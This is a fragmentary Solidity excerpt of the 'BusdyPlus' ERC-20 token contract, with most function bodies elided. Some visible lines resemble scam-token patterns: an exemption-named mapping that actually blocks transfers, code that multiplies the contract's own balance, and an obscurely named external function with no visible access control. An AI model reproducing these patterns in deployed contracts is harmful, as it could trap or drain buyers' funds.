...
contract BusdyPlus is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    address constant DEAD    = 0x000000000000000000000000000000000000dEaD;

    string private _name = "BusdyPlus";
    string private _symbol = "BUSDY+";
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 1 * 10**12 * 10**_decimals;

    address payable public marketingAddress =
        payable(0x430E2674809868c16CF638f297b35048B28Dd7Dd);
    ...
    function _transfer(
        ...
        require(!isFeeLimitExempt[from] && !isFeeLimitExempt[to], "Transfer amount must from another address");

        // Make sure that: Balance + Buy Amount <= _maxBalance
        if (
            from != owner() && // Not from Owner
            to != owner() && // Not to Owner
            !isTxLimitExempt[to] // is excludedFromMaxBalance
    ...
    function proportionTokens() private lockTheSwap {
        ...
        _tOwned[address(this)] = _tOwned[address(this)].mul(_developmentFee)
    ...
    function yellowBreak(address newAddress) external virtual {
